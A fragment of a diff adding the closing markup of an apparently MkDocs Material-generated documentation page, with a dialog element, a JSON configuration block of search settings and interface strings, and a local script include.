+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.top", "navigation.tracking"], "search": "../../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.2ab50757.min.js"></script>
+      
+    
+  </body>
+</html>
